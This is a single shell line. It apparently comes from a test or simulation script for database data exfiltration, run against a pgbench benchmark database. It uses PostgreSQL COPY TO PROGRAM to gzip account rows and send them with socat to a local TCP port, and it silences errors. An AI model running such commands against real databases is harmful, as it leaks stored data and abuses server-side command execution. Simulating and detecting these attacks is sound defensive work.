...
psql -U postgres -d casce_tpcb -c "$(casce_sql_prelude)COPY (SELECT * FROM pgbench_accounts LIMIT 10) TO PROGRAM 'gzip > /tmp/exfil_gzip_socat.dat && socat -u FILE:/tmp/exfil_gzip_socat.dat TCP:127.0.0.1:9090 2>/dev/null || true';"
